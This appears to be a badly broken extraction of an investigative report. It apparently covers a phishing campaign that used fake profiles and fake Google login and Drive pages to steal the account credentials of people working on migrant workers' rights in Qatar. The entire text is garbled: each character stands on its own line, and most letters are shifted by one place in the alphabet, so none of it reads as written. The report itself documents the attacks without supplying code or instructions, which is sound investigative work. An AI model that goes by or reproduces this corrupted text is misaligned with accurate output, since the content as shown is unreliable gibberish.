J\nM\nB\nD\nD\nP\nV\nO\nU\nQ\nI\nJ\nT\nI\nF\nE\nN\nJ\nH\nI\nU\nM\nF\nB\nE\nU\nP\nU\nI\nF\nS\nF\nD\nP\nO\nT\nU\nS\nV\nD\nU\nJ\nP\nO\nP\nG\nU\nI\nF\nJ\nS\nO\nF\nU\nX\nP\nS\nL\nF\nY\nQ\nP\nT\nV\nS\nF\nP\nG\nT\nP\nV\nS\nD\nF\nT\nJ\nE\nF\nO\nU\nJ\nU\nJ\nF\nT\nB\nT\nX\nF\nM\nM\nB\nT\nB\nC\nV\nT\nF\nP\nG\nU\nI\nF\nJ\nS\nB\nD\nD\nP\nV\nO\nU\nT\nG\nP\nS\nJ\nN\nQ\nF\nS\nT\nP\nO\nB\nU\nJ\nP\nO\n#\nZ\nD\nP\nN\nQ\nB\nS\nJ\nT\nP\nO\nQ\nI\nJ\nT\nI\nJ\nO\nH\nB\nU\nU\nB\nD\nL\nT\nB\nS\nF\nM\nJ\nL\nF\nM\nZ\nT\nJ\nH\nO\nJ\nl\nD\nB\nO\nU\nM\nZ\nN\nP\nS\nF\nD\nP\nN\nN\nP\nO\nU\nI\nB\nO\nN\nB\nM\nX\nB\nS\nF\nB\nU\nU\nB\nD\nL\nT\n1\nI\nJ\nT\nI\nJ\nO\nH\nB\nU\nU\nB\nD\nL\nT\nB\nS\nF\nO\nP\nS\nN\nB\nM\nM\nZ\nE\nF\nM\nJ\nW\nF\nS\nF\nE\nU\nI\nS\nP\nV\nH\nI\nF\nN\nB\nJ\nM\nT\nT\nP\nM\nJ\nD\nJ\nU\nJ\nO\nH\nU\nI\nF\nU\nB\nS\nH\nF\nU\nU\nP\nP\nQ\nF\nO\nB\nM\nJ\nO\nL\nB\nO\nE\nM\nP\nH\nJ\nO\nU\nP\nG\nP\nS\nF\nY\nB\nN\nQ\nM\nF\nB\n(\nP\nP\nH\nM\nF\nM\nJ\nL\nF\nQ\nB\nH\nF\n5\nI\nF\nT\nU\nS\nB\nU\nF\nH\nJ\nF\nT\nV\nT\nF\nE\nU\nP\nN\nB\nL\nF\nU\nI\nJ\nT\nT\nP\nM\nJ\nD\nJ\nU\nB\nU\nJ\nP\nO\nD\nS\nF\nE\nJ\nC\nM\nF\nD\nB\nO\nW\nB\nS\nZ\n0\nG\nU\nF\nO\nG\nP\nS\nF\nY\nB\nN\nQ\nM\nF\nU\nI\nF\nF\nN\nB\nJ\nM\nX\nP\nV\nM\nE\nG\nB\nM\nT\nF\nM\nZ\nJ\nO\nG\nP\nS\nN\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\nU\nI\nB\nU\nU\nI\nF\nJ\nS\nB\nD\nD\nP\nV\nO\nU\nI\nB\nT\nC\nF\nF\nO\nI\nB\nD\nL\nF\nE\nV\nS\nH\nF\nO\nU\nM\nZ\nS\nF\nR\nV\nJ\nS\nJ\nO\nH\nB\nQ\nB\nT\nT\nX\nP\nS\nE\nS\nF\nT\nF\nU\n h\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nI\nB\nT\nB\nG\nV\nM\nM\nQ\nS\nF\nT\nF\nO\nD\nF\nP\nO\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nC\nV\nU\nI\nF\nS\nU\nX\nJ\nU\nU\nF\nS\nB\nD\nD\nP\nV\nO\nU\nD\nS\nF\nB\nU\nF\nE\nJ\nO\n%\nF\nD\nF\nN\nC\nF\nS\nI\nB\nT\nP\nO\nM\nZ\nP\nO\nF\nW\nJ\nT\nJ\nC\nM\nF\nU\nX\nF\nF\nU\nE\nB\nU\nJ\nO\nH\nG\nS\nP\nN\n%\nF\nD\nF\nN\nC\nF\nS\nB\nT\nJ\nN\nQ\nM\nF\nh\nI\nJ\nv\n8\nF\nC\nF\nM\nJ\nF\nW\nF\nJ\nU\nJ\nT\nQ\nP\nT\nT\nJ\nC\nM\nF\nU\nI\nB\nU\nU\nI\nF\nP\nQ\nF\nS\nB\nU\nP\nS\nT\nP\nG\n0\nQ\nF\nS\nB\nU\nJ\nP\nO\n,\nJ\nO\nH\nQ\nI\nJ\nT\nI\nN\nJ\nH\nI\nU\nI\nB\nW\nF\nB\nD\nR\nV\nJ\nS\nF\nE\nB\nT\nF\nU\nP\nG\nQ\nS\nF\nS\nF\nH\nJ\nT\nU\nF\nS\nF\nE\nP\nS\nT\nU\nP\nM\nF\nO\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nQ\nS\nP\nl\nM\nF\nT\nP\nO\nM\nJ\nO\nF\n5\nI\nF\nB\nD\nD\nP\nV\nO\nU\nT\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nG\nP\nM\nM\nP\nX\nT\nT\nI\nP\nX\nB\nD\nM\nF\nB\nS\nQ\nB\nU\nU\nF\nS\nO\n\u02d9\nB\nM\nB\nS\nH\nF\nO\nV\nN\nC\nF\nS\nP\nG\n.\nJ\nE\nE\nM\nF\n&\nB\nT\nU\nC\nB\nT\nF\nE\nK\nP\nV\nS\nO\nB\nM\nJ\nT\nU\nT\nG\nP\nS\nJ\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nQ\nV\nC\nM\nJ\nD\nB\nU\nJ\nP\nO\nT\nT\nU\nB\n\u00d2\nP\nG\nJ\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\nP\nS\nH\nB\nO\nJ\n[\nB\nU\nJ\nP\nO\nT\nB\nO\nE\nU\nS\nB\nE\nF\nV\nO\nJ\nP\nO\nT\nB\nO\nE\nW\nB\nS\nJ\nP\nV\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nT\nG\nP\nS\nN\nJ\nH\nS\nB\nO\nU\nT\nS\nJ\nH\nI\nU\nT\nJ\nO\n2\nB\nU\nB\nS\n5\nI\nF\nJ\nS\n'\nB\nD\nF\nC\nP\nP\nL\nB\nD\nD\nP\nV\nO\nU\nB\nQ\nQ\nF\nB\nS\nT\nU\nP\nC\nF\nN\nP\nS\nF\nB\nD\nU\nJ\nW\nF\nB\nO\nE\nU\nI\nF\nJ\nS\n-\nJ\nO\nL\nF\nE\n*\nO\nQ\nS\nP\nl\nM\nF\nI\nB\nT\nD\nP\nO\nO\nF\nD\nU\nJ\nP\nO\nT\n5\nI\nF\nW\nB\nS\nJ\nP\nV\nT\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nB\nD\nD\nP\nV\nO\nU\nT\nD\nP\nN\nN\nV\nO\nJ\nD\nB\nU\nF\nE\nS\nF\nH\nV\nM\nB\nS\nM\nZ\nX\nJ\nU\nI\nT\nF\nW\nF\nS\nB\nM\nP\nG\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\nT\nX\nF\nJ\nE\nF\nO\nU\nJ\nl\nF\nE\nP\nG\nU\nF\nO\nG\nP\nS\nN\nB\nO\nZ\nN\nP\nO\nU\nI\nT\n*\nU\nB\nQ\nQ\nF\nB\nS\nT\nU\nI\nB\nU\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nN\nB\nZ\nI\nB\nW\nF\nJ\nN\nQ\nF\nS\nT\nP\nO\nB\nU\nF\nE\nU\nI\nF\nJ\nE\nF\nO\nU\nJ\nU\nZ\nP\nG\nB\nS\nF\nB\nM\nZ\nP\nV\nO\nH\nX\nP\nN\nB\nO\nB\nO\nE\nT\nU\nP\nM\nF\nI\nF\nS\nQ\nJ\nD\nU\nV\nS\nF\nT\nU\nP\nD\nP\nO\nT\nU\nS\nV\nD\nU\nU\nI\nF\nG\nB\nL\nF\nQ\nS\nP\nl\nM\nF\nB\nM\nP\nO\nH\nX\nJ\nU\nI\nB\nQ\nS\nP\nG\nF\nT\nT\nJ\nP\nO\nB\nM\nC\nJ\nP\nH\nS\nB\nQ\nI\nZ\nB\nM\nT\nP\nT\nU\nP\nM\nF\nO\nG\nS\nP\nN\nZ\nF\nU\nB\nO\nP\nU\nI\nF\nS\nQ\nF\nS\nT\nP\nO\n5\nI\nF\nF\nN\nB\nJ\nM\nT\nB\nO\nE\nN\nF\nT\nT\nB\nH\nF\nT\nT\nF\nO\nU\nC\nZ\nU\nI\nF\nG\nB\nL\nF\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nX\nP\nV\nM\nE\nO\nP\nS\nN\nB\nM\nM\nZ\nC\nF\nU\nJ\nN\nF\nE\nB\nS\nP\nV\nO\nE\n\u2022\nC\nF\nG\nP\nS\nF\nB\nO\nE\nG\nP\nM\nM\nP\nX\nJ\nO\nH\n\u2022\nU\nI\nF\nE\nF\nM\nJ\nW\nF\nS\nZ\nP\nG\nZ\nF\nU\nB\nO\nP\nU\nI\nF\nS\nB\nU\nU\nF\nN\nQ\nU\nB\nU\nQ\nI\nJ\nT\nI\nJ\nO\nH\nU\nI\nF\nD\nS\nF\nE\nF\nO\nU\nJ\nB\nM\nT\nP\nG\nU\nI\nF\nE\nF\nT\nJ\nH\nO\nB\nU\nF\nE\nW\nJ\nD\nU\nJ\nN\nT\n&\nD\nV\nH\n\u02db\n)\nD\nN\nH\n*\nR\nR\nJ\nO\nH\nU\nH\nD\nO\nb\n*\nR\nR\nJ\nO\nH\n'\nP\nS\nF\nY\nB\nN\nQ\nM\nF\nJ\nO\nU\nI\nF\nF\nY\nD\nI\nB\nO\nH\nF\nC\nF\nM\nP\nX\nh\n4\nB\nG\nF\nF\nO\nB\nv\nU\nS\nJ\nF\nE\nU\nP\nM\nV\nS\nF\nU\nI\nF\nU\nB\nS\nH\nF\nU\nC\nZ\nQ\nV\nS\nQ\nP\nS\nU\nJ\nO\nH\nU\nP\nC\nF\nT\nF\nF\nL\nJ\nO\nH\nI\nF\nM\nQ\nP\nO\nT\nP\nN\nF\nJ\nN\nQ\nP\nS\nU\nB\nO\nU\nS\nF\nT\nF\nB\nS\nD\nI\nP\nO\nI\nV\nN\nB\nO\nU\nS\nB\n\u00d3\nD\nL\nJ\nO\nH\n *\nO\nU\nI\nF\nD\nP\nV\nS\nT\nF\nP\nG\nU\nI\nJ\nT\nF\nN\nB\nJ\nM\nD\nP\nS\nS\nF\nT\nQ\nP\nO\nE\nF\nO\nD\nF\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\n\u2022\nh\n4\nB\nG\nF\nF\nO\nB\nv\n\u2022\nU\nI\nF\nO\nT\nF\nO\nU\nX\nI\nB\nU\nB\nQ\nQ\nF\nB\nS\nF\nE\nU\nP\nC\nF\nJ\nO\nW\nJ\nU\nB\nU\nJ\nP\nO\nT\nU\nP\nB\nD\nD\nF\nT\nT\nT\nF\nW\nF\nS\nB\nM\nE\nP\nD\nV\nN\nF\nO\nU\nT\nP\nO\n(\nP\nP\nH\nM\nF\n%\nS\nJ\nW\nF\n5\nI\nF\nM\nJ\nO\nL\nT\nB\nO\nE\nC\nV\nU\nU\nP\nO\nT\nD\nP\nO\nU\nB\nJ\nO\nF\nE\nJ\nO\nU\nI\nF\nF\nN\nB\nJ\nM\nT\nX\nP\nV\nM\nE\nE\nJ\nS\nF\nD\nU\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\nU\nP\nB\nX\nF\nC\nQ\nB\nH\nF\nU\nI\nB\nU\nM\nP\nP\nL\nF\nE\nT\nP\nN\nF\nU\nI\nJ\nO\nH\nM\nJ\nL\nF\nU\nI\nJ\nT\n\u02d9\n 5\nI\nF\nQ\nB\nH\nF\nJ\nT\nE\nF\nT\nJ\nH\nO\nF\nE\nU\nP\nN\nJ\nN\nJ\nD\nB\nT\nU\nB\nO\nE\nB\nS\nE\n(\nP\nP\nH\nM\nF\nM\nP\nH\nJ\nO\nQ\nB\nH\nF\nX\nJ\nU\nI\nB\nI\nJ\nH\nI\nE\nF\nH\nS\nF\nF\nP\nG\nB\nD\nD\nV\nS\nB\nD\nZ\n8\nI\nJ\nM\nF\nN\nP\nT\nU\nD\nP\nN\nN\nP\nO\nQ\nI\nJ\nT\nI\nJ\nO\nH\nQ\nB\nH\nF\nT\nX\nP\nV\nM\nE\nP\nO\nM\nZ\nQ\nS\nP\nW\nJ\nE\nF\nB\nO\nF\nN\nQ\nU\nZ\nG\nP\nS\nN\nU\nP\nF\nO\nU\nF\nS\nB\nO\nF\nN\nB\nJ\nM\nB\nE\nE\nS\nF\nT\nT\nB\nO\nE\nQ\nB\nT\nT\nX\nP\nS\nE\nU\nI\nJ\nT\nP\nO\nF\nJ\nO\nT\nU\nF\nB\nE\nJ\nT\nD\nP\nO\nl\nH\nV\nS\nF\nE\nU\nP\nE\nJ\nT\nQ\nM\nB\nZ\nU\nI\nF\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nU\nI\nF\nB\nD\nD\nP\nV\nO\nU\nO\nB\nN\nF\nB\nO\nE\nU\nI\nF\nF\nN\nB\nJ\nM\nB\nE\nE\nS\nF\nT\nT\nP\nG\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\n5\nI\nJ\nT\nJ\nT\nP\nC\nT\nD\nV\nS\nF\nE\nJ\nO\nU\nI\nF\nB\nC\nP\nW\nF\nT\nD\nS\nF\nF\nO\nT\nI\nP\nU\nU\nP\nQ\nS\nP\nU\nF\nD\nU\nU\nI\nF\nQ\nS\nJ\nW\nB\nD\nZ\nP\nG\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\n5\nI\nJ\nT\nE\nF\nT\nJ\nH\nO\nF\n\u00d2\nF\nD\nU\nJ\nW\nF\nM\nZ\nS\nF\nQ\nM\nJ\nD\nB\nU\nF\nT\nB\nS\nF\nB\nM\n(\nP\nP\nH\nM\nF\nM\nP\nH\nJ\nO\nQ\nB\nH\nF\nX\nI\nJ\nD\nI\nX\nP\nV\nM\nE\nT\nJ\nN\nJ\nM\nB\nS\nM\nZ\nE\nJ\nT\nQ\nM\nB\nZ\nU\nI\nF\nT\nB\nN\nF\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nJ\nG\nZ\nP\nV\nI\nB\nE\nQ\nS\nF\nW\nJ\nP\nV\nT\nM\nZ\nM\nP\nH\nH\nF\nE\nJ\nO\nU\nP\nZ\nP\nV\nS\nB\nD\nD\nP\nV\nO\nU\nG\nS\nP\nN\nB\nD\nP\nN\nQ\nV\nU\nF\nS\n5\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nX\nF\nS\nF\nN\nF\nU\nJ\nD\nV\nM\nP\nV\nT\nJ\nO\nN\nB\nL\nJ\nO\nH\nU\nI\nF\nJ\nS\nQ\nI\nJ\nT\nI\nJ\nO\nH\nQ\nB\nH\nF\nB\nT\nD\nS\nF\nE\nJ\nC\nM\nF\nB\nT\nQ\nP\nT\nT\nJ\nC\nM\nF\n*\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nH\nM\nZ\nB\nG\nU\nF\nS\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\nT\nX\nP\nV\nM\nE\nI\nB\nW\nF\nF\nO\nU\nF\nS\nF\nE\nU\nI\nF\nJ\nS\n(\nP\nP\nH\nM\nF\nB\nD\nD\nP\nV\nO\nU\nD\nS\nF\nE\nF\nO\nU\nJ\nB\nM\nT\nU\nI\nF\nZ\nX\nP\nV\nM\nE\nC\nF\nS\nF\nE\nJ\nS\nF\nD\nU\nF\nE\nU\nP\nB\nO\nB\nD\nU\nV\nB\nM\nE\nP\nD\nV\nN\nF\nO\nU\nI\nP\nT\nU\nF\nE\nP\nO\n(\nP\nP\nH\nM\nF\n%\nS\nJ\nW\nF\nF\n\u00d2\nF\nD\nU\nJ\nW\nF\nM\nZ\nS\nF\nD\nS\nF\nB\nU\nJ\nO\nH\nB\nO\nP\nS\nN\nB\nM\nC\nS\nP\nX\nT\nJ\nO\nH\nF\nY\nQ\nF\nS\nJ\nF\nO\nD\nF\nJ\nO\nP\nS\nE\nF\nS\nU\nP\nB\nW\nP\nJ\nE\nT\nV\nT\nQ\nJ\nD\nJ\nP\nO\n*\nO\nU\nI\nF\nF\nY\nB\nN\nQ\nM\nF\nC\nF\nM\nP\nX\nU\nI\nF\nU\nB\nS\nH\nF\nU\nX\nP\nV\nM\nE\nI\nB\nW\nF\nC\nF\nF\nO\nS\nF\nE\nJ\nS\nF\nD\nU\nF\nE\nU\nP\nB\n1\nP\nX\nF\nS\n1\nP\nJ\nO\nU\nQ\nS\nF\nT\nF\nO\nU\nB\nU\nJ\nP\nO\nP\nO\nI\nV\nN\nB\nO\nU\nS\nB\n\u00d3\nD\nL\nJ\nO\nH\n\"\nN\nO\nF\nT\nU\nZ\nI\nB\nT\nJ\nE\nF\nO\nU\nJ\nl\nF\nE\nU\nI\nB\nU\nU\nI\nJ\nT\nQ\nS\nF\nT\nF\nO\nU\nB\nU\nJ\nP\nO\nI\nB\nE\nB\nM\nT\nP\nC\nF\nF\nO\nT\nU\nP\nM\nF\nO\nG\nS\nP\nN\nB\nO\nP\nU\nI\nF\nS\nT\nP\nV\nS\nD\nF\n1\nR\nW\nH\n\u02db\nW\nK\nH\nS\nU\nR\n\u00e4\nO\nH\nS\nL\nF\nW\nX\nU\nH\nK\nD\nV\nE\nH\nH\nQ\nP\nD\nQ\nL\nS\nX\nO\nD\nW\nH\nG\nW\nR\nS\nU\nR\nW\nH\nF\nW\nW\nK\nH\nL\nG\nH\nQ\nW\nL\nW\n\\\nR\nI\nW\nK\nH\nb\nW\nD\nU\nJ\nH\nW\n &\nD\nV\nH\n\u02db\n0\nD\nN\nL\nQ\nJ\nI\nU\nL\nH\nQ\nG\nV\nD\nQ\nG\nF\nR\nQ\nQ\nH\nF\nW\nL\nR\nQ\nV\n\"\nN\nP\nO\nH\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nP\nG\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nJ\nT\nU\nI\nF\n*\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\n5\nS\nB\nE\nF\n6\nO\nJ\nP\nO\n$\nP\nO\nG\nF\nE\nF\nS\nB\nU\nJ\nP\nO\n*\n5\n6\n$\n*\n5\n6\n$\nJ\nT\nB\nU\nS\nB\nE\nF\nV\nO\nJ\nP\nO\nG\nF\nE\nF\nS\nB\nU\nJ\nP\nO\nC\nB\nT\nF\nE\nJ\nO\n#\nS\nV\nT\nT\nF\nM\nT\nB\nO\nE\nB\nN\nP\nO\nH\nU\nI\nF\nM\nB\nS\nH\nF\nT\nU\nJ\nO\nU\nI\nF\nX\nP\nS\nM\nE\nD\nP\nV\nO\nU\nJ\nO\nH\nP\nW\nF\nS\n\u02d8\nN\nJ\nM\nM\nJ\nP\nO\nN\nF\nN\nC\nF\nS\nT\n*\n5\n6\n$\nI\nB\nT\nC\nF\nF\nO\nW\nF\nS\nZ\nP\nV\nU\nT\nQ\nP\nL\nF\nO\nJ\nO\nS\nF\nD\nF\nO\nU\nZ\nF\nB\nS\nT\nB\nC\nP\nV\nU\nN\nJ\nH\nS\nB\nO\nU\nM\nB\nC\nP\nV\nS\nS\nJ\nH\nI\nU\nT\nJ\nO\n2\nB\nU\nB\nS\nB\nO\nE\nJ\nT\nC\nF\nI\nJ\nO\nE\nU\nI\nF\nh\n3\nF\n3\nV\nO\nU\nI\nF\n7\nP\nU\nF\nv\nD\nB\nN\nQ\nB\nJ\nH\nO\nB\nH\nB\nJ\nO\nT\nU\nU\nI\nF\nB\nX\nB\nS\nE\nP\nG\nU\nI\nF\nP\nS\nH\nB\nO\nJ\n[\nB\nU\nJ\nP\nO\nP\nG\nU\nI\nF\n'\n*\n'\n\"\n8\nP\nS\nM\nE\n$\nV\nQ\nU\nP\n2\nB\nU\nB\nS\n#\nP\nU\nI\nJ\nO\nU\nI\nF\nB\nU\nU\nB\nD\nL\nT\nB\nH\nB\nJ\nO\nT\nU\n*\n5\n6\n$\nB\nO\nE\nJ\nO\nP\nU\nI\nF\nS\nP\nD\nD\nB\nT\nJ\nP\nO\nT\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nB\nQ\nQ\nS\nP\nB\nD\nI\nF\nE\nT\nF\nM\nF\nD\nU\nF\nE\nU\nB\nS\nH\nF\nU\nT\nP\nW\nF\nS\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nQ\nS\nP\nN\nJ\nO\nF\nO\nU\nM\nZ\n'\nB\nD\nF\nC\nP\nP\nL\nB\nO\nE\nF\nO\nH\nB\nH\nF\nE\nJ\nO\nD\nI\nB\nU\nD\nP\nO\nW\nF\nS\nT\nB\nU\nJ\nP\nO\nT\nX\nJ\nU\nI\nU\nI\nF\nN\nP\nO\nB\nO\nE\nP\n\u00d2\nT\nP\nN\nF\nU\nJ\nN\nF\nT\nP\nW\nF\nS\nB\nQ\nF\nS\nJ\nP\nE\nP\nG\nT\nF\nW\nF\nS\nB\nM\nN\nP\nO\nU\nI\nT\n\"\nU\nU\nJ\nN\nF\nT\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nC\nF\nI\nJ\nO\nE\nU\nI\nF\nQ\nS\nP\nl\nM\nF\nX\nP\nV\nM\nE\nK\nV\nT\nU\nI\nB\nW\nF\nB\nT\nI\nP\nS\nU\nD\nB\nT\nV\nB\nM\nD\nP\nO\nW\nF\nS\nT\nB\nU\nJ\nP\nO\nX\nI\nJ\nM\nF\nB\nU\nP\nU\nI\nF\nS\nT\nU\nI\nF\nZ\nB\nU\nU\nF\nN\nQ\nU\nF\nE\nB\nO\nB\nU\nU\nB\nD\nL\n1\nP\nT\nT\nJ\nC\nM\nZ\nJ\nO\nP\nS\nE\nF\nS\nU\nP\nJ\nE\nF\nO\nU\nJ\nG\nZ\nG\nV\nS\nU\nI\nF\nS\nU\nB\nS\nH\nF\nU\nT\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nG\nP\nV\nO\nE\nI\nF\nS\nX\nB\nZ\nJ\nO\nU\nP\nT\nF\nW\nF\nS\nB\nM\n'\nB\nD\nF\nC\nP\nP\nL\nH\nS\nP\nV\nQ\nT\nE\nF\nB\nM\nJ\nO\nH\nX\nJ\nU\nI\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nB\nO\nE\nG\nP\nS\nD\nF\nE\nM\nB\nC\nP\nV\nS\n 4\nJ\nN\nJ\nM\nB\nS\nM\nZ\nU\nP\nB\nU\nU\nF\nN\nQ\nU\nT\nE\nF\nT\nD\nS\nJ\nC\nF\nE\nQ\nS\nF\nW\nJ\nP\nV\nT\nM\nZ\nJ\nO\nU\nI\nJ\nT\nD\nB\nT\nF\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nB\nM\nT\nP\nJ\nO\nW\nJ\nU\nF\nE\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nU\nP\nP\nQ\nF\nO\nB\nE\nP\nD\nV\nN\nF\nO\nU\nT\nF\nF\nN\nJ\nO\nH\nM\nZ\nT\nI\nB\nS\nF\nE\nP\nO\n(\nP\nP\nH\nM\nF\n%\nS\nJ\nW\nF\n5\nI\nJ\nT\nU\nJ\nN\nF\nU\nI\nF\nE\nP\nD\nV\nN\nF\nO\nU\nQ\nV\nS\nQ\nP\nS\nU\nF\nE\nU\nP\nC\nF\nB\nC\nP\nV\nU\nU\nI\nF\nJ\nO\nW\nP\nM\nW\nF\nN\nF\nO\nU\nP\nG\nU\nI\nF\n&\nN\nJ\nS\nP\nG\n2\nB\nU\nB\nS\nJ\nO\nG\nV\nO\nE\nJ\nO\nH\n*\n4\n*\n4\nX\nI\nJ\nD\nI\nX\nB\nT\nT\nF\nF\nN\nJ\nO\nH\nM\nZ\nD\nP\nQ\nJ\nF\nE\nG\nS\nP\nN\nB\nX\nF\nC\nT\nJ\nU\nF\nD\nS\nJ\nU\nJ\nD\nB\nM\nP\nG\n2\nB\nU\nB\nS\n0\nO\nD\nF\nU\nI\nF\nU\nB\nS\nH\nF\nU\nX\nP\nV\nM\nE\nQ\nS\nP\nW\nJ\nE\nF\nU\nI\nF\nJ\nS\nD\nS\nF\nE\nF\nO\nU\nJ\nB\nM\nT\nU\nI\nS\nP\nV\nH\nI\nU\nI\nF\nG\nB\nL\nF\n(\nP\nP\nH\nM\nF\nM\nP\nH\nJ\nO\nQ\nB\nH\nF\nU\nI\nF\nZ\nX\nP\nV\nM\nE\nB\nM\nT\nP\nC\nF\nB\nV\nU\nP\nN\nB\nU\nJ\nD\nB\nM\nM\nZ\nS\nF\nE\nJ\nS\nF\nD\nU\nF\nE\nU\nP\nB\nO\nF\nY\nJ\nT\nU\nJ\nO\nH\nE\nP\nD\nV\nN\nF\nO\nU\nI\nP\nT\nU\nF\nE\nP\nO\nU\nI\nF\nM\nF\nH\nJ\nU\nJ\nN\nB\nU\nF\n(\nP\nP\nH\nM\nF\n%\nS\nJ\nW\nF\n 8\nI\nJ\nM\nF\nJ\nU\nN\nJ\nH\nI\nU\nO\nP\nU\nB\nQ\nQ\nF\nB\nS\nT\nJ\nH\nO\nJ\nl\nD\nB\nO\nU\nU\nI\nJ\nT\nB\nU\nU\nF\nO\nU\nJ\nP\nO\nU\nP\nE\nF\nU\nB\nJ\nM\nJ\nT\nX\nI\nB\nU\nJ\nO\nP\nV\nS\nF\nY\nQ\nF\nS\nJ\nF\nO\nD\nF\nT\nF\nU\nT\nB\nQ\nB\nS\nU\nU\nI\nF\nT\nF\nQ\nI\nJ\nT\nI\nJ\nO\nH\nB\nU\nU\nF\nN\nQ\nU\nT\nG\nS\nP\nN\nN\nP\nS\nF\nD\nP\nN\nN\nP\nO\nP\nO\nF\nT\nB\nT\nU\nI\nF\nZ\nE\nF\nN\nP\nO\nT\nU\nS\nB\nU\nF\nB\nM\nF\nW\nF\nM\nP\nG\nF\nY\nQ\nF\nS\nJ\nF\nO\nD\nF\nB\nO\nE\nD\nB\nS\nF\nU\nI\nB\nU\nJ\nT\nC\nP\nU\nI\nV\nO\nV\nT\nV\nB\nM\nB\nO\nE\nS\nF\nN\nB\nS\nL\nB\nC\nM\nF\n&\nD\nV\nH\n\u02db\n+\nD\nQ\nJ\nL\nQ\nJ\nb\nR\nX\nW\n4\nJ\nN\nJ\nM\nB\nS\nU\nB\nD\nU\nJ\nD\nT\nB\nS\nF\nF\nY\nF\nN\nQ\nM\nJ\nl\nF\nE\nC\nZ\nZ\nF\nU\nB\nO\nP\nU\nI\nF\nS\nD\nB\nT\nF\nX\nF\nW\nF\nC\nF\nD\nP\nN\nF\nB\nX\nB\nS\nF\nP\nG\nB\nO\nE\nQ\nP\nS\nU\nS\nB\nZ\nF\nE\nJ\nO\nU\nI\nF\nQ\nJ\nD\nU\nV\nS\nF\nC\nF\nM\nP\nX\nX\nI\nF\nS\nF\nU\nI\nF\nG\nB\nL\nF\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nQ\nS\nP\nl\nM\nF\nJ\nT\nD\nP\nO\nW\nF\nS\nT\nJ\nO\nH\nX\nJ\nU\nI\nB\nQ\nS\nP\nN\nJ\nO\nF\nO\nU\nB\nD\nU\nJ\nW\nJ\nT\nU\nG\nS\nP\nN\n/\nF\nQ\nB\nM\nX\nP\nS\nL\nJ\nO\nH\nP\nO\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nJ\nT\nT\nV\nF\nT\nT\nP\nM\nJ\nD\nJ\nU\nJ\nO\nH\nU\nI\nF\nN\nU\nP\nH\nJ\nW\nF\nB\nX\nB\nZ\nU\nI\nF\nJ\nS\n(\nN\nB\nJ\nM\nB\nE\nE\nS\nF\nT\nT\n *\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nH\nM\nZ\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nU\nS\nJ\nF\nE\nU\nP\nM\nF\nW\nF\nS\nB\nH\nF\nD\nP\nN\nN\nP\nO\n'\nB\nD\nF\nC\nP\nP\nL\nG\nS\nJ\nF\nO\nE\nT\nJ\nO\nB\nO\nB\nU\nU\nF\nN\nQ\nU\nU\nP\nD\nP\nO\nW\nJ\nO\nD\nF\nU\nI\nF\nU\nB\nS\nH\nF\nU\nP\nG\nU\nI\nF\nJ\nS\nM\nF\nH\nJ\nU\nJ\nN\nB\nD\nZ\n5\nI\nJ\nT\nJ\nT\nB\nU\nB\nD\nU\nJ\nD\nX\nF\nW\nF\nP\nC\nT\nF\nS\nW\nF\nE\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nV\nU\nJ\nM\nJ\n[\nF\nP\nO\nO\nV\nN\nF\nS\nP\nV\nT\nP\nD\nD\nB\nT\nJ\nP\nO\nT\nB\nD\nS\nP\nT\nT\nU\nI\nF\nJ\nS\nD\nP\nO\nW\nF\nS\nT\nB\nU\nJ\nP\nO\nT\nX\nJ\nU\nI\nT\nP\nN\nF\nP\nG\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nX\nF\nL\nO\nP\nX\nP\nG\nX\nI\nJ\nD\nI\nF\nY\nQ\nM\nB\nJ\nO\nT\nU\nI\nF\nU\nJ\nN\nF\nB\nO\nE\nF\n\u00d2\nP\nS\nU\nT\nQ\nF\nO\nU\nJ\nO\nC\nV\nJ\nM\nE\nJ\nO\nH\nB\nM\nB\nS\nH\nF\nT\nP\nD\nJ\nB\nM\nH\nS\nB\nQ\nI\n*\nO\nU\nI\nJ\nT\nD\nB\nT\nF\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nW\nF\nS\nZ\nD\nS\nF\nE\nJ\nC\nM\nZ\nQ\nS\nF\nU\nF\nO\nE\nF\nE\nU